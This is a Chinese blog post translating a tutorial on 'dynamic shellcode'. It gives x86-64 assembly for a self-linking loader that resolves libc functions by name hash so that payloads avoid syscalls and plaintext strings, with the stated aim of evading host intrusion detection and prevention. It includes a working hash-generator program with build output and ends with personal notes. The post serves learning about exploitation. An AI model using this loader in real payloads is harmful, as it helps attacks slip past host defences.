---
layout: post
title: "Shellcode/Dynamic"
excerpt: "动态shellcode"
category: exploit
tags: [shellcode]
disqus: true
---


意译：[Shellcode/Dynamic](http://blackhat.life/Dynamic_Shellcode)

动态shellcode是自链接的shellcode，用来规避多种主机层面的防护措施，比如主机入侵检测系统(HIDS)或者主机入侵防护系统(HIPS)。这些措施能阻止传统的null-free shellcode。通过动态shellcode技术，实现比如不包含中断、系统调用或者明文函数字符串等。

[TOC]

## 评价

大多安全设施组件都基于RAM的数据和标记为可执行的内容进行运行时分析。而且，许多系统甚至从内核检查内核中断和系统调用(linux审计工具audit就做这个)。其它也许监视ld-linux中提供给普通应用使用共享库调用的`_ld_runtime_resolve`的运行，`_dl_fixup()`的蹦床(trampoline,确定不是函数式编程？？？？)等。当应用尝试执行不在它们`.text`段的系统调用或中断、或者尝试使用`_ld_runtime_resolve`，`_dl_fixup`,`dl_open`,`dl_close`或者`dl_sym`来导入一个不在它导入表(import talbe)的函数时，会触发许多安全系统的警告。另外，使用比如像`dl_open()`和`dl_sym()`这样的函数需要使用明文字符串。任何一般的分析都能很容易迅速逆向有效载荷，这是传统null-free shellcode的另一个问题。

一个动态shellcode引擎能够解决这些问题。通过避免C调用惯例使用的寄存器，它可以构建允许开发者写出动态自链接代码的链接器(linker)。于是完全不再需要中断或者系统调用，因为链接器能不倚靠操作系统导入函数。另外，函数哈希被用作阻止函数名通过字符串呈现，解决了上面标准null-free shellcode有的问题。

## C调用惯例的影响

通常的系统调用格式或者libc函数调用：

    function_call(%rax) = function(%rdi,  %rsi,  %rdx,  %r10,  %r8,  %r9)

返回值通常置于`rax`中，然而当结构指针被作为参数传递时，在那个参数寄存器中一个指向更改过的结构的指针被返回。

以上陈述显示：写一个链接器时，以下寄存器在没有系统调用的调用之前，不必为函数调用保存。

    %rax, %rbx, %rcx, %rbp, %r11, %r12, %r13, %r14, %r15

大多数寄存器能更改或者被各种libc函数更改，然而`rbx`在libc中被保留为开发者使用。当写一个动态链接器时，函数参数必须被保留，这样开发者能轻易写出动态集成的代码。最后，链接器取`rbx`作为库的基址指针，`rbp`用来哈希函数。这确保了开发者能保持对`rax`,`rdi`,`rsi`,`rdx`,`r10`,`r8`和`r9`的控制。`rcx`寄存器被用来作为指向调用函数标签的指针，也许应在函数调用间被保留。

## 函数哈希

这个功能希望`rdx`是0，`rsi`中是指向字符串的指针。接着它完成字符串的单向32位哈希并保存在`rsi`中。

首先，把被哈希程序(hasher)使用的不是`rsi`的寄存器保留：

    calc_hash:

    preserve_regs:
        push rax
        push rdx

`rdx`作为调用哈希程序的代码的零寄存器(zreg/zero register)。可以指通过简单的`push/pop`把`rax`置零来：

    initialize_regs:
        push rdx
        pop rax

接着，DF位(directional flag)被清空。这很重要，因为接下来的哈希过程使用了`lodsd`，而有漏洞应用的DF位不确定。

    cld

接着，`al`中的字节和`edx`相加，结果存入`edx`。左移12位(0xc)，当`lodsd`载入的字节是null时，哈希值就计算完毕了。

    calc_hash_loop:
        lodsb
        rol edx, 0xc
        add edx, eax
        test al, al
        jnz calc_hash_loop

接着使用push和pop把哈希置入`rsi`：

    calc_done:
        push rdx
        pop rsi

最后，恢复保存到寄存器

    restore_regs:
        pop rdx
        pop rax

## 遍历到GOT的动态节(dynamic section)

当前执行进程的动态节程序头总是在VMA(Virtual Memory Adress，虚拟内存地址)`0x00400130`。以下是个没有`\x00`(null-free)的版本：

    _start:
        push 0x400130ff
        pop rbx
        shr ebx, 0x8

指向动态节的指针被抽取，长度被添加到动态节的长度上。GOT(Global Offset Table，全局偏移表)刚好就在动态节后面。通过以这种方式计算偏移量，可以不必从文件头中读取GOT的位置来遍历GOT。这有无数的好处。(译者：不知道有啥好处。。。)

    fast_got:
        mov rcx, [rbx]
        add rcx, [rbx+0x10]

### 抽取一个库指针

这个代码从GOT抽取个指向libc中任意函数的指针。比如在`rcx+0x18`地方，有指向`_dl_runtime_resolve`的指针。

    extract_pointer:
        mov rbx, [rcx+0x20]

现在寻找想要导入的二进制文件的基指针，首先寻找`\x7fELF`。因为RAM倒着保存信息，使用逆向比较来决定何时逆向循环。

    find_base:
        dec rbx
        cmp [rbx], 0x464c457f
        jne find_base

### 用户定义代码

现在基指针被计算出来，该载入开发者或用户的代码了。为了让调用函数(`invoke_function`)从寄存器中可重用，通过getPC来把调用函数的地址存入`rcx`。

    jmp startup

    __initialize_world:
        pop rcx
        jmp _world

    startup:
        call __initialize_word

    invoke_function:
        ...
    _world:
        ; user-defined code goes here

### 接口

这里开发的运行时链接器能让用户自定的代码从`_world`开始。这个接口让开发者能提供函数哈希到`rbp`并且执行`call [rcx]`代替系统调用。这个例子描述了从内核调用exit(0)到使用链接器的API来调用exit(0)的过程。

以未链接的exit形式开始：

    exit：
        push 0x3c
        pop rax
        xor rdi, rdi
        syscall

哈希`exit`(上面的相加右移)得到`0x696c4780`

     ✘  ~/Work/project/blackhat/shellcode  cat hash-generator.s 
    BITS 64
    
    global _start
    _start:
        jmp startup
    
    calc_hash:
    ; accept rsi hold function name.
    ; rdx=0 first
    ; return hash in rsi
    ; use rax, rdx, rsi
        ; preserve rax&rdx
        push rax    ; use as accum
        push rdx    ; zero register
    
        initialize_regs:
            push rdx
            pop rax ;rax = 0
            cld; clear zf for lodsb
    
            calc_hash_loop:
                lodsb   ; load one byte from rsi to al
                rol edx, 0xc    ;right shift 12bits
                add edx, eax    ;add eax to edx
                test al, al     ; if al='\0'
                jnz calc_hash_loop
    
        calc_done:
            push rdx
            pop rsi ; move hash in rdx to rsi
    
        pop rdx
        pop rax ; restore rdx&rax
    ret
    
    startup:
        pop rax ; pointer to calc_hash
        pop rax ; argc
        pop rsi ; pointer to argv[]
    
        xor rdx, rdx    ;rdx=0
        call calc_hash
    
        push rsi    ; save hash on stack
        mov rsi, rsp    ; rsi hold pointer to hash now
    
        push rdx    ; null
        mov rcx, rsp    ; rcx hold pointer to null now
    
        mov rdi, 0x4
        loop:
            ; 倒着复制的
            dec rdi
            mov al, [rsi+rdi*1]
            mov [rcx+rdx*1], al
            inc rdx
            cmp rdi, 0  ; gas 竟然不能cmp %rdi, $0....但可以倒过来
            jnz loop
    
        mov rsi, rcx    ;rsi hold pointer to reverse hash
        inc rdi ; rdi = 1
        mov rax, rdi    ; rax = 1
        syscall         ; write(1, reverse hash)
    
        mov rax, 0x3c   ; rax=60
        dec rdi         ; rdi=0
        syscall         ; exit(0)
     ~/Work/project/blackhat/shellcode  nasm -felf64 hash-generator.s -o hash-generator.o
     ~/Work/project/blackhat/shellcode  ld hash-generator.o -o hash-generator
     ~/Work/project/blackhat/shellcode  ./hash-generator exit|hexdump -C
    00000000  69 6c 47 80                                       |ilG.|
    00000004

所以，`_world`这么写

    _world:
        push 0x696c4780
        pop rbp ; 正好倒过来，看看hash-generator.s的代码
        xor rdi, rdi
        call [rcx]

开发者应该记着当调用那些可能改变寄存器的调用函数时保存`rcx`。或者通过更改`__initialize_world`中pop到的寄存器来移除限制。

### 调用的函数

这个注释是为了防止开发者忘记接口功能：

    ;
    ;  Takes a function hash in %rbp and base pointer in %rbx
    ;  >Parses the dynamic program headers of the ELF64 image
    ;  >Uses ROP to invoke the function on the way back to the
    ;  -normal return location
    ;
    ;  Returns results of function to invoke.
    ;

所有和libc交互的寄存器和任何可能被链接器使用的寄存器必须被保留，这样它们才能在函数调用时被恢复，`rbp`寄存器被保留两次。这时因为第一次保留在返回前被指向目的函数的指针覆盖。这让shellcode从目的函数返回到开发者定义的函数。

    invoke_function:
        push rbp
        push rbp
        push rdx
        push rdi
        push rax
        push rbx
        push rsi

将`rdx`赋为0,吧函数哈希放入`rdi`来进行将来的比较

    set_regs:
        xor rdx, rdx
        push rbp
        pop rdi

然后目的库导入的基址指针就放入`rbp`

    copy_base:
        push rbx
        pop rbp

需要读取`[rbx+0x130]`四字节，但是添加到八字节的寄存器。

    read_dynamic_section:
        push 0x4c
        pop rax
        add rbx, [rbx + rax * 4]

找到函数导出表，一般叫做`.dynsym`，或者动态符号表。通过遍历头检查动态节的类型。

    check_dynamic_type:
        add rbx, 0x10
        cmpb [rbx], 0x5
        jne check_dynamic_type

一旦ebx指向程序头中正确的位置;放置字符串表的绝对地址到`rax`和动态符号表的绝对地址到`rbx`。

    string_table_found:
        mov rax, [rbx+0x8]  ; rax是动态字符串表的地址
        mov rbx, [rbx+0x18] ; rbx是指向符号表的地址

接着，增加到下一个导出，指向字符串的指针被放入`rsi`来哈希

    check_next_hash:
        add rbx, 0x18   ;下一个条目
        push rdx
        pop rsi
        xor si, [rbx]
        add rsi, rax

`calc_hash`标签被如上描述方式调用来哈希函数名。

    calc_hash:
        ...

比较当前导出表的函数哈希和想要导出的函数哈希，如果不匹配则跳到下一次导入：

    check_current_hash:
        cmp edi, esi
        jne check_next_hash

一旦哈希被找到，它的函数偏移位于`[rbx+0x8]`四字节。`rdx`被用来作为零寄存器来得到没有`\x00`的四字节。FIXME(not so) 添加到`rbp`基址指针：

    found_hash:
        add rbp, [rbx+4*rdx+0x8]

这里，第一个例子中被保留的`rbp`被目的函数的地址覆盖。

    mov [esp+0x30], rbp

最后恢复所有寄存器。

        pop rsi
        pop rbx
        pop rax
        pop rdi
        pop rdx
        pop rbp
    ret

跳到目的函数代码。

### 动态shell

一旦添加链接器，一个115字节的socket重用载荷就变成了268字节的动态载入版本。这里有几种优化的方式，作为读者的练习。。。我得回头看看。。。

算了，我先看看[Load-time relocation of shared libraries](http://eli.thegreenplace.net/2011/08/25/load-time-relocation-of-shared-libraries/)

令上午承蒙翔哥内推，刚填了简历，下午竟然就给我打电话电面了。。。然后就是强行谈及二进制安全被血虐最后被鄙视的过程，哈哈哈。

慢慢看，不把安全作为工作也许是种幸福呢。

毕业前：

- 游戏
- 画

兴趣：

- 统计学习
- 二进制安全

工作：
- ？
